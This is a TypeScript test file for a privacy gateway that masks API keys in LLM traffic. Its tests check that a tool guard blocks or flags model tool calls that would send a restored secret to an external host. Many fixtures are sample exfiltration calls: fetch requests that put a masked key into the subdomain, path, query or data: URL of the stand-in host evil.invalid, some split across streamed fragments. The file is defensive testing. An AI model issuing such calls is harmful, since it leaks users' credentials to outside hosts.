import test from 'node:test'
import assert from 'node:assert/strict'
import { randomBytes } from 'node:crypto'
import { mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Context } from '@deepseek-ai/cordis'

import { defaults, resolveConfig, type ToolGuard } from '../src/config.ts'
import { PrivacyEngine, RequestBlocked } from '../src/engine.ts'
import { RecordStore } from '../src/records.ts'
import { NAMESPACE, PrivacyGatewayService } from '../src/remote.ts'
import { jsonEscape } from '../src/redact/json.ts'
import { Masker } from '../src/redact/mask.ts'
import { ValueTable } from '../src/redact/known.ts'
import { newTally, Restorer } from '../src/redact/restore.ts'
import { ViewStore } from '../src/views.ts'
import { unescapeJSON } from '../src/redact/guard.ts'

const KEY = 'sk-' + 'auditlowerkey0123456789abcdefghij'
const info = { host: 'api.example.invalid', path: '/v1/chat/completions' }
const chat = (content = KEY, model = 'm') => JSON.stringify({ model, messages: [{ role: 'user', content }] })
const toolReply = (args: string) => JSON.stringify({ choices: [{ message: { tool_calls: [{ type: 'function', function: { name: 'fetch', arguments: args } }] } }] })
const event = (data: unknown) => `data: ${JSON.stringify(data)}\n\n`
const enc = new TextEncoder()

function setup(guard: ToolGuard = 'block', shape = false) {
  const warnings: string[] = []
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, restoreLog: true, toolGuard: guard, shape }), { logger: { warn: (...args: unknown[]) => warnings.push(args.map(String).join(' ')) } })
  const ex = engine.maskRequest(chat(), info)
  assert.ok(ex)
  const p = (JSON.parse(ex.text) as { messages: Array<{ content: string }> }).messages[0]?.content
  assert.ok(p && p !== KEY)
  return { engine, ex, p, warnings }
}

async function remoteText(engine: PrivacyEngine): Promise<string> {
  const ctx = new Context()
  const fiber = ctx.plugin(PrivacyGatewayService, { overview: () => ({ active: true, secrets: true, personal: false, record: true, values: engine.values, stats: engine.records.stats(), recent: engine.records.recent() }) })
  await fiber
  try {
    const svc = ctx.get(NAMESPACE) as PrivacyGatewayService
    return JSON.stringify(await svc.overview({ limit: 50 }))
  } finally {
    fiber.dispose()
  }
}

for (const guard of ['warn', 'block'] as const) {
  test(`${guard}: a restored key in a URL host stays out of logs, records, JSONL and Remote`, async () => {
    const root = mkdtempSync(join(tmpdir(), 'dpg-restoring-audit-'))
    const dir = join(root, 'masking')
    const records = new RecordStore({ dir, keepDays: 30, keepBytes: 1 << 20, keepRecords: 20, flushDelayMs: 0 })
    const warnings: string[] = []
    try {
      const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, restoreLog: true, toolGuard: guard }), { records, logger: { warn: (...args: unknown[]) => warnings.push(args.map(String).join(' ')) } })
      const ex = engine.maskRequest(chat(), info)
      assert.ok(ex)
      const p = (JSON.parse(ex.text) as { messages: Array<{ content: string }> }).messages[0]?.content
      assert.ok(p)
      const out = ex.restoreBody(toolReply(JSON.stringify({ url: `https://${p}.evil.invalid/` })))
      assert.equal(out.includes(KEY), guard === 'warn')
      ex.finish()
      await records.flush()
      assert.equal(records.recent()[0]?.exfil, 1)
      assert.equal(warnings.length, 1)
      assert.ok(records.recent()[0]?.exfilHosts?.[0]?.includes('evil.invalid'))
      const disk = readdirSync(dir).map((name) => readFileSync(join(dir, name), 'utf8')).join('')
      for (const [where, text] of Object.entries({ logs: warnings.join('\n'), records: JSON.stringify(records.recent()), stats: JSON.stringify(records.stats()), disk, remote: await remoteText(engine) })) {
        assert.ok(!text.includes(KEY), `${where} contains the true value`)
      }
    } finally {
      await records.flush()
      rmSync(root, { recursive: true, force: true })
    }
  })
}

test('model and all request metadata use a request-time audit projection, without changing model on the wire', async () => {
  const metadata = `prefix${KEY}suffix`
  const config = resolveConfig({ ...defaults, allow: [metadata], restoreLog: true, toolGuard: 'warn' })
  const engine = new PrivacyEngine(randomBytes(32), config, { names: () => ({ title: metadata, workspace: metadata }) })
  const ex = engine.maskRequest(chat(KEY, metadata), { ...info, host: `${metadata}.invalid`, session: metadata })
  assert.ok(ex)
  assert.equal((JSON.parse(ex.text) as { model: string }).model, metadata)
  engine.reconfigure(resolveConfig({ ...defaults, secrets: false, allow: [KEY, metadata] }))
  ex.finish()
  const record = engine.records.recent()[0]
  assert.ok(record?.model && record.host && record.session && record.title && record.workspace)
  assert.ok(!JSON.stringify(record).includes(KEY))
  assert.ok(!JSON.stringify(engine.records.stats()).includes(KEY))
  assert.ok(!(await remoteText(engine)).includes(KEY))
})

test('blocked request metadata has the same audit boundary even when a full metadata value is allowed', () => {
  const metadata = `prefix${KEY}suffix`
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, actions: { API_KEY: 'block' }, allow: [metadata] }))
  assert.throws(() => engine.maskRequest(chat(KEY, metadata), { ...info, host: `${metadata}.invalid`, session: metadata }), RequestBlocked)
  assert.equal(engine.records.recent()[0]?.blocked, true)
  assert.ok(!JSON.stringify(engine.records.recent()).includes(KEY))
  assert.ok(!JSON.stringify(engine.records.stats()).includes(KEY))
})

for (const vendor of ['anthropic', 'gemini'] as const) {
  const reply = (input: unknown) => vendor === 'anthropic'
    ? { content: [{ type: 'tool_use', id: 'c', name: 'fetch', input }] }
    : { candidates: [{ content: { parts: [{ functionCall: { name: 'fetch', args: input } }] } }] }
  for (const shape of [false, true]) {
    for (const surface of ['key', 'value'] as const) {
      test(`${vendor} JSON guard covers ${surface} placeholders${shape ? ' in shape mode' : ''}`, () => {
        const { engine, ex, p } = setup('block', shape)
        const query = surface === 'key' ? { [p]: '1' } : { token: p }
        const out = ex.restoreBody(JSON.stringify(reply({ url: 'https://evil.invalid/', query })))
        assert.ok(!out.includes(KEY))
        assert.ok(out.includes(p))
        ex.finish()
        assert.equal(engine.records.recent()[0]?.exfil, 1)
        assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
        assert.equal(engine.records.recent()[0]?.restoredInTools, undefined)
      })
    }
    test(`${vendor} SSE guard covers complete object keys${shape ? ' in shape mode' : ''}`, () => {
      const { engine, ex, p } = setup('block', shape)
      const restorer = ex.streamRestorer()
      const first = restorer.push(enc.encode(event(reply({ url: 'https://evil.invalid/', query: { [p]: '1' } }))))
      assert.equal(first, '')
      const out = first + restorer.push(enc.encode('data: [DONE]\n\n')) + restorer.end()
      assert.ok(!out.includes(KEY))
      assert.ok(out.includes(p))
      ex.finish()
      assert.equal(engine.records.recent()[0]?.exfil, 1)
      assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
    })
    test(`${vendor} SSE harmless object keys are restored and counted${shape ? ' in shape mode' : ''}`, () => {
      const { engine, ex, p } = setup('block', shape)
      const restorer = ex.streamRestorer()
      const out = restorer.push(enc.encode(event(reply({ query: { [p]: '1' } })))) + restorer.end()
      assert.ok(out.includes(KEY))
      ex.finish()
      assert.equal(engine.records.recent()[0]?.restoredInTools, 1)
      assert.equal(engine.records.recent()[0]?.exfil, undefined)
    })
  }
}

test('an external URL in an object key participates in the guard too', () => {
  const { engine, ex, p } = setup()
  const reply = { content: [{ type: 'tool_use', input: { ['https://evil.invalid/']: p } }] }
  assert.ok(!ex.restoreBody(JSON.stringify(reply)).includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
})

for (const guard of ['warn', 'block'] as const) {
  for (const shape of [false, true]) {
    test(`${guard} keeps earlier known values out of audit when this request has no hits${shape ? ' with shapes' : ''}`, async () => {
      const { engine, ex: first, p, warnings } = setup(guard, shape)
      first.finish()
      engine.reconfigure(resolveConfig({ ...defaults, secrets: false, allow: [KEY], restoreLog: true, toolGuard: guard, shape }))
      const ex = engine.maskRequest(chat('plain', `prefix${KEY}suffix`), { ...info, session: `session-${KEY}` })
      assert.ok(ex)
      const r = ex.streamRestorer()
      const payload = event({ choices: [{ delta: { tool_calls: [{ function: { arguments: JSON.stringify({ url: `https://${p}.evil.invalid/` }) } }] } }] })
      const out = r.push(enc.encode(payload)) + r.push(enc.encode('data: [DONE]\n\n')) + r.end()
      assert.equal(out.includes(KEY), guard === 'warn')
      ex.finish()
      const rec = engine.records.recent()[0]
      assert.equal(rec?.n, 0)
      assert.equal(rec?.exfil, 1)
      for (const text of [JSON.stringify(rec), JSON.stringify(engine.records.stats()), warnings.join('\n'), await remoteText(engine)]) assert.ok(!text.includes(KEY))
    })
  }
}

test('the direct restorer tally is safe after host case-folding, even without an engine', () => {
  const key = 'sk-' + 'AuditMixedCase0123456789abcdefgh'
  const table = new ValueTable(100)
  const masker = new Masker(randomBytes(32), table, { secrets: true, protectTools: true, protectEnvBlock: true })
  const p = masker.placeholder('API_KEY', key)
  for (const guard of ['warn', 'block'] as const) {
    const tally = newTally()
    new Restorer(table, guard).restoreJSON(toolReply(JSON.stringify({ url: `https://${p}.evil.invalid/` })), tally)
    assert.equal(tally.exfil, 1)
    assert.ok(!JSON.stringify([...tally.exfilHosts]).includes(key.toLowerCase()))
  }
})

test('escaped metadata and kept role/type strings do not expose a request trueform', () => {
  const word = 'Audit\\Quoted"Value012345'
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, words: [word] }))
  const body = JSON.stringify({ model: `prefix${jsonEscape(word)}suffix`, messages: [{ role: KEY, type: KEY, content: `${KEY} ${word}` }] })
  const ex = engine.maskRequest(body, info)
  assert.ok(ex)
  assert.equal((JSON.parse(ex.text) as { model: string }).model, `prefix${jsonEscape(word)}suffix`)
  ex.finish()
  const record = JSON.stringify(engine.records.recent())
  assert.ok(!record.includes(KEY))
  assert.ok(!record.includes(jsonEscape(jsonEscape(word))))
  assert.ok(!engine.auditText(`prefix${jsonEscape(word)}suffix`)?.includes(jsonEscape(word)))
  assert.equal(engine.auditText('session-42c3da6f-0123-4567-89ab-0123456789ab'), 'session-42c3da6f-0123-4567-89ab-0123456789ab')
})

test('audit projection failures omit metadata instead of returning the original text', () => {
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig(defaults))
  const saved = Masker.prototype.preview
  Masker.prototype.preview = () => { throw new Error('synthetic projection failure') }
  try {
    assert.equal(engine.auditText(KEY), undefined)
    const ex = engine.maskRequest(chat(KEY, KEY), { ...info, host: KEY, session: KEY })
    assert.ok(ex)
    ex.finish()
    const record = engine.records.recent()[0]
    assert.equal(record?.host, '')
    assert.equal(record?.model, undefined)
    assert.equal(record?.session, undefined)
    assert.ok(!JSON.stringify(record).includes(KEY))
  } finally {
    Masker.prototype.preview = saved
  }
})

test('sealed object fields still contribute external destinations while their own placeholders stay opaque', () => {
  for (const streamed of [false, true]) {
    const { engine, ex, p } = setup()
    const payload = { content: [{ type: 'tool_use', input: { token: p, signature: `https://evil.invalid/${p}`, data: `data:text/plain,${p}` } }] }
    const out = streamed ? (() => { const r = ex.streamRestorer(); return r.push(enc.encode(event(payload))) + r.end() })() : ex.restoreBody(JSON.stringify(payload))
    assert.ok(!out.includes(KEY))
    assert.ok(out.includes(`https://evil.invalid/${p}`))
    assert.ok(out.includes(`data:text/plain,${p}`))
    ex.finish()
    assert.equal(engine.records.recent()[0]?.exfilBlocked, streamed ? 1 : 2, 'whole JSON historically restores data; SSE treats data: text as opaque')
    assert.equal(engine.records.recent()[0]?.restoredInTools, undefined)
    assert.equal(engine.records.recent()[0]?.exfil, 1)
  }
})

test('object field sealing does not recursively change the historical string-argument restoration rules', () => {
  const { ex, p } = setup('off')
  const input = { token: p, signature: `https://evil.invalid/${p}`, data: `data:text/plain,${p}` }
  const objectReply = JSON.parse(ex.restoreBody(JSON.stringify({ content: [{ type: 'tool_use', input }] }))) as { content: Array<{ input: Record<string, string> }> }
  assert.equal(objectReply.content[0]?.input.signature, input.signature)
  assert.equal(objectReply.content[0]?.input.data, `data:text/plain,${KEY}`, 'whole JSON preserves the historical data restoration rule')
  const stream = ex.streamRestorer()
  const streamed = stream.push(enc.encode(event({ content: [{ type: 'tool_use', input }] }))) + stream.end()
  assert.ok(streamed.includes(input.data), 'SSE preserves the historical sealed data: rule')
  assert.equal(objectReply.content[0]?.input.token, KEY)
  const stringReply = JSON.parse(ex.restoreBody(toolReply(JSON.stringify(input)))) as { choices: Array<{ message: { tool_calls: Array<{ function: { arguments: string } }> } }> }
  const args = JSON.parse(stringReply.choices[0]?.message.tool_calls[0]?.function.arguments ?? '') as Record<string, string>
  assert.equal(args.signature, `https://evil.invalid/${KEY}`)
  assert.equal(args.data, `data:text/plain,${KEY}`)
  const blocked = setup('block')
  assert.ok(!blocked.ex.restoreBody(toolReply(JSON.stringify({ token: blocked.p, signature: `https://evil.invalid/${blocked.p}` }))).includes(KEY))
})

test('opaque-only placeholders do not become eligible just because they name an external destination', () => {
  const { engine, ex, p } = setup()
  const body = JSON.stringify({ content: [{ type: 'tool_use', input: { token: 'plain', signature: `https://evil.invalid/${p}`, encrypted_content: p } }] })
  assert.equal(ex.restoreBody(body), body)
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, undefined)
  assert.equal(engine.records.recent()[0]?.restored, 0)
})

test('streamed value tails under a restored object key are cut before they are emitted', () => {
  const { ex, p } = setup('off')
  const r = ex.streamRestorer()
  const payload = (value: string) => event({ input: { [p]: value } })
  assert.equal(r.push(enc.encode(payload(`prefix ${p.slice(0, 12)}`))), '')
  const next = r.push(enc.encode(payload(p.slice(12))))
  const out = next + r.end()
  const values = out.split('\n').filter((line) => line.startsWith('data: ')).map((line) => JSON.parse(line.slice(6)) as { input: Record<string, string> })
  assert.deepEqual(values.map((value) => Object.keys(value.input)), [[KEY], [KEY]])
  assert.equal(values.map((value) => value.input[KEY]).join(''), `prefix ${KEY}`)
})

test('a dotted literal field is not a tool parameter subtree', () => {
  const { engine, ex, p } = setup()
  const body = JSON.stringify({ ['input.query']: { url: 'https://evil.invalid/', token: p } })
  assert.ok(ex.restoreBody(body).includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, undefined)
})

for (const action of ['warn', 'block'] as const) {
  test(`${action} audit-only memory survives later requests after words are removed and allowed`, async () => {
    const word = 'AuditPrivateName'
    const metadata = `prefix${word}suffix`
    const root = mkdtempSync(join(tmpdir(), 'dpg-audit-memory-'))
    const dir = join(root, 'masking')
    const records = new RecordStore({ dir, keepDays: 30, keepBytes: 1 << 20, keepRecords: 20, flushDelayMs: 0 })
    const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, words: [word], actions: { TERM: action }, restoreLog: true }), { records, names: () => ({ title: metadata, workspace: metadata }) })
    let p = ''
    try {
      if (action === 'block') {
        assert.throws(() => engine.maskRequest(chat(word), { ...info, session: metadata }), (err) => {
          if (!(err instanceof RequestBlocked)) return false
          p = err.hits[0]?.placeholder ?? ''
          return true
        })
      } else {
        const first = engine.maskRequest(chat(word), { ...info, session: metadata })
        assert.ok(first)
        assert.equal(first.text, chat(word))
        assert.equal(first.restoring(), false)
        first.finish()
        p = engine.records.recent()[0]?.values[0]?.placeholder ?? ''
      }
      assert.ok(p)
      assert.equal(engine.values, 0, 'audit-only memory is not the restoration table')
      engine.reconfigure(resolveConfig({ ...defaults, words: [], allow: [word], restoreLog: true }))
      const bareBody = chat(word)
      const bare = engine.maskRequest(bareBody, info)
      assert.ok(bare)
      assert.equal(bare.text, bareBody, 'an old warned or blocked value is not known-masked on the wire')
      assert.equal(engine.preview(word).text, word)
      const reply = JSON.stringify({ content: p })
      assert.equal(bare.restoreBody(reply), reply, 'audit-only memory cannot restore its placeholder')
      bare.finish()
      assert.equal(engine.values, 0)
      const body = JSON.stringify({ model: metadata, messages: [{ role: metadata, type: metadata, content: KEY }] })
      const next = engine.maskRequest(body, { ...info, host: `${metadata}.invalid`, session: metadata })
      assert.ok(next)
      assert.equal((JSON.parse(next.text) as { model: string }).model, metadata)
      next.finish()
      const current = engine.records.recent()[0]
      assert.ok(current?.model && current.session && current.title && current.workspace)
      assert.ok(!JSON.stringify(current).includes(word))
      assert.ok(!engine.auditText(metadata)?.includes(word))
      assert.equal(engine.values, 1, 'only the normally masked API key enters the value table')
      await records.flush()
      const disk = readdirSync(dir).map((name) => readFileSync(join(dir, name), 'utf8')).join('')
      for (const text of [JSON.stringify(engine.records.stats()), await remoteText(engine), disk]) assert.ok(!text.includes(word))
    } finally {
      await records.flush()
      rmSync(root, { recursive: true, force: true })
    }
  })
}

test('audit-only memory is bounded by maxValues and refreshes only actual request hits', () => {
  const words = Array.from({ length: 101 }, (_, i) => `AuditPrivateName${String(i).padStart(4, '0')}`)
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, maxValues: 100, words, actions: { TERM: 'warn' } }))
  engine.maskRequest(chat(words.slice(0, 100).join(' ')), info)?.finish()
  engine.maskRequest(chat(words[0]), info)?.finish()
  engine.maskRequest(chat(words[100]), info)?.finish()
  engine.reconfigure(resolveConfig({ ...defaults, words: [], allow: words }))
  assert.equal(engine.values, 0)
  assert.equal(engine.auditText(`prefix${words[1]}suffix`), `prefix${words[1]}suffix`, 'the least recently hit value was evicted')
  for (const i of [0, 2, 99, 100]) assert.ok(!engine.auditText(`prefix${words[i]}suffix`)?.includes(words[i] as string), `value ${i} remains in the bounded audit memory`)
  assert.equal(engine.preview(words[0] as string).text, words[0], 'audit lookups do not feed the wire masker')
})

test('audit-memory eviction does not weaken an in-flight request snapshot', () => {
  const words = Array.from({ length: 101 }, (_, i) => `AuditSnapshotName${String(i).padStart(4, '0')}`)
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, maxValues: 100, words, actions: { TERM: 'warn' } }))
  const model = words.join('|')
  const first = engine.maskRequest(chat(words.join(' '), model), info)
  assert.ok(first)
  engine.reconfigure(resolveConfig({ ...defaults, words: [], allow: words }))
  assert.equal(engine.auditText(`prefix${words[0]}suffix`), `prefix${words[0]}suffix`, 'the bounded current memory has evicted the oldest value')
  first.finish()
  const recorded = JSON.stringify(engine.records.recent()[0])
  for (const word of words) assert.ok(!recorded.includes(word), 'the request snapshot still protects every hit, including overflow')
  assert.equal(engine.values, 0)
})

for (const term of ['API', 'DSH']) {
  test(`audit projection preserves placeholder atoms when the public protocol contains the word ${term}`, () => {
    const views = new ViewStore()
    const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, vendorView: true, words: [term], actions: { TERM: 'warn' } }), { views })
    const ex = engine.maskRequest(JSON.stringify({ messages: [{ role: 'user', content: `${term} ${KEY}` }], metadata: { [KEY]: KEY } }), info)
    assert.ok(ex)
    const wireKey = Object.keys((JSON.parse(ex.text) as { metadata: Record<string, string> }).metadata)[0] as string
    assert.equal(engine.auditText(wireKey), wireKey)
    ex.finish()
    const value = engine.records.recent()[0]?.values.find((v) => v.kind === 'API_KEY')
    const places = [value?.at, ...(value?.elsewhere ?? [])]
    assert.ok(places.some((place) => place?.path === `metadata.${wireKey}`), 'the audit path must use the wire placeholder atom without nested placeholders')
    const rec = engine.records.recent()[0]
    assert.ok(rec)
    const view = JSON.parse(views.get(rec.key) ?? '') as { metadata: Record<string, string> }
    assert.equal(Object.keys(view.metadata)[0], wireKey, 'warnedView also preserves the public protocol atom')
  })
}

test('audit-only literals written with noncanonical Unicode escapes are projected after rule removal', () => {
  const word = 'AuditPrivateName'
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, words: [word], actions: { TERM: 'warn' } }))
  engine.maskRequest(chat(word), info)?.finish()
  engine.reconfigure(resolveConfig({ ...defaults, words: [], allow: [word] }))
  for (const form of ['\\u0041' + word.slice(1), '\\u0041\\u0075' + word.slice(2)]) {
    for (const text of [form, jsonEscape(form)]) {
      const safe = engine.auditText(`prefix${text}suffix`)
      assert.ok(safe)
      assert.ok(!unescapeJSON(unescapeJSON(safe)).includes(word))
    }
  }
})

test('current shape stand-ins remain opaque even when their text contains a remembered short word', () => {
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, shape: true }))
  const first = engine.maskRequest(chat(), info)
  assert.ok(first)
  const fake = (JSON.parse(first.text) as { messages: Array<{ content: string }> }).messages[0]?.content as string
  const term = fake.slice(3, 6)
  engine.reconfigure(resolveConfig({ ...defaults, shape: true, words: [term], actions: { TERM: 'warn' } }))
  engine.maskRequest(chat(term), info)?.finish()
  assert.equal(engine.auditText(fake), fake)
})

for (const vendor of ['anthropic', 'gemini'] as const) {
  const reply = (input: unknown) => vendor === 'anthropic' ? { content: [{ type: 'tool_use', input }] } : { candidates: [{ content: { parts: [{ functionCall: { name: 'fetch', args: input } }] } }] }
  for (const [kind, value] of [['API_KEY', 'sk-trailingunderscore0123456789abcd_'], ['TERM', '123456789012345']] as const) {
    test(`${vendor} SSE guard preserves different field boundaries for ${kind}`, () => {
      const table = new ValueTable(100)
      const p = new Masker(randomBytes(32), table, { secrets: true, protectTools: true, protectEnvBlock: true }).placeholder(kind, value)
      const body = reply({ token: p, url: 'https://evil.invalid/' })
      const restorer = new Restorer(table, 'block')
      assert.ok(!restorer.restoreJSON(JSON.stringify(body)).includes(value), 'the whole JSON control is blocked')
      const tally = newTally()
      const r = restorer.stream(tally)
      const out = r.push(enc.encode(event(body))) + r.end()
      assert.ok(!out.includes(value))
      assert.equal(tally.exfil, 1)
      assert.equal(tally.exfilBlocked, 1)
    })
  }
  test(`${vendor} same-field fragments join across events without adjoining other fields`, () => {
    const { engine, ex, p } = setup()
    const r = ex.streamRestorer()
    const first = r.push(enc.encode(event(reply({ token: p.slice(0, 12), url: 'https://evil.invalid/' }))))
    assert.equal(first, '')
    const out = first + r.push(enc.encode(event(reply({ token: p.slice(12) })))) + r.end()
    assert.ok(!out.includes(KEY))
    ex.finish()
    assert.equal(engine.records.recent()[0]?.exfil, 1)
    assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
  })
}

test('an empty Responses arguments delta does not close a guarded fragment run', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const delta = (text: string) => event({ type: 'response.function_call_arguments.delta', item_id: 'call1', output_index: 0, delta: text })
  assert.equal(r.push(enc.encode(delta(`{"token":"${p}",`))), '')
  assert.equal(r.push(enc.encode(delta(''))), '', 'an empty known argument fragment must keep the run held')
  const out = r.push(enc.encode(delta('"url":"https://evil.invalid/"}'))) + r.push(enc.encode('data: [DONE]\n\n')) + r.end()
  assert.ok(!out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, 1)
  assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
})

for (const vendor of ['anthropic', 'gemini'] as const) {
  for (const empty of [{}, []]) {
    test(`${vendor} empty ${Array.isArray(empty) ? 'array' : 'object'} parameters keep a guard run held`, () => {
      const { engine, ex, p } = setup()
      const r = ex.streamRestorer()
      const payload = (input: unknown) => event(vendor === 'anthropic' ? { content: [{ type: 'tool_use', id: 'c', input }] } : { candidates: [{ content: { parts: [{ functionCall: { name: 'fetch', args: input } }] } }] })
      assert.equal(r.push(enc.encode(payload({ token: p }))), '')
      assert.equal(r.push(enc.encode(payload(empty))), '', 'an empty parameter container is not a finish event')
      const out = r.push(enc.encode(payload({ url: 'https://evil.invalid/' }))) + r.end()
      assert.ok(!out.includes(KEY))
      ex.finish()
      assert.equal(engine.records.recent()[0]?.exfil, 1)
      assert.equal(engine.records.recent()[0]?.exfilBlocked, 1)
    })
  }
}

test('different Responses item identities cannot manufacture a URL by joining their fields', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const delta = (item_id: string, text: string) => event({ type: 'response.custom_tool_call_input.delta', item_id, output_index: 0, delta: text })
  const out = r.push(enc.encode(delta('item1', 'https://'))) + r.push(enc.encode(delta('item2', `evil.invalid/${p}`))) + r.end()
  assert.ok(out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, undefined)
})

test('actual streamed tail carry cannot join placeholder halves from different nested tool identities', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const payload = (id: string, input: unknown) => event({ content: [{ type: 'tool_use', id, input }] })
  const out = r.push(enc.encode(payload('call0', { token: p.slice(0, 12) }))) + r.push(enc.encode(payload('call1', { token: p.slice(12), url: 'https://evil.invalid/' }))) + r.end()
  assert.ok(!out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.restoredInTools, undefined)
})

test('an empty parameter container updates the tool identity before later id-less fragments', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const payload = (input: unknown, id?: string) => event({ content: [{ type: 'tool_use', ...(id !== undefined ? { id } : {}), input }] })
  const out = r.push(enc.encode(payload({ token: p.slice(0, 12) }, 'call0'))) + r.push(enc.encode(payload({}, 'call1'))) + r.push(enc.encode(payload({ token: p.slice(12), url: 'https://evil.invalid/' }))) + r.end()
  assert.ok(!out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.restoredInTools, undefined)
})

test('actual streamed tail carry cannot join argument halves from different protocol tool indexes', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const payload = (index: number, args: string) => event({ choices: [{ index: 0, delta: { tool_calls: [{ index, function: { arguments: args } }] } }] })
  const out = r.push(enc.encode(payload(0, `{"token":"${p.slice(0, 12)}`))) + r.push(enc.encode(payload(1, `${p.slice(12)}","url":"https://evil.invalid/"}`))) + r.end()
  assert.ok(!out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.restoredInTools, undefined)
})

test('actual streamed tail carry retains a tool identity when later deltas omit its id', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const payload = (input: unknown, id?: string) => event({ content: [{ type: 'tool_use', ...(id !== undefined ? { id } : {}), input }] })
  const out = r.push(enc.encode(payload({ token: p.slice(0, 12) }, 'call0'))) + r.push(enc.encode(payload({ token: p.slice(12) }))) + r.end()
  assert.ok(out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.restoredInTools, 1)
})

test('different tool indexes at the same array position cannot manufacture a URL', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const delta = (index: number, arguments_: string) => event({ choices: [{ index: 0, delta: { tool_calls: [{ index, function: { arguments: arguments_ } }] } }] })
  const out = r.push(enc.encode(delta(0, 'https://'))) + r.push(enc.encode(delta(1, `evil.invalid/${p}`))) + r.end()
  assert.ok(out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, undefined)
})

test('lossless dotted leaf positions cannot manufacture a URL inside one event', () => {
  const { engine, ex, p } = setup()
  const r = ex.streamRestorer()
  const out = r.push(enc.encode(event({ input: { ['left.url']: 'https://', left: { url: `evil.invalid/${p}` } } }))) + r.end()
  assert.ok(out.includes(KEY))
  ex.finish()
  assert.equal(engine.records.recent()[0]?.exfil, undefined)
})

test('a blocked attempt is not the first sending coordinate', () => {
  let at = { turn: 1, step: 1 }
  const engine = new PrivacyEngine(randomBytes(32), resolveConfig({ ...defaults, actions: { API_KEY: 'block' } }), { steps: () => at })
  assert.throws(() => engine.maskRequest(chat(), { ...info, session: 's' }), RequestBlocked)
  engine.reconfigure(resolveConfig(defaults))
  at = { turn: 1, step: 2 }
  engine.maskRequest(chat(), { ...info, session: 's' })?.finish()
  assert.equal(engine.records.recent()[0]?.values[0]?.first, undefined)
  at = { turn: 1, step: 3 }
  engine.maskRequest(chat(), { ...info, session: 's' })?.finish()
  assert.deepEqual(engine.records.recent()[0]?.values[0]?.first, { turn: 1, step: 2 })
})
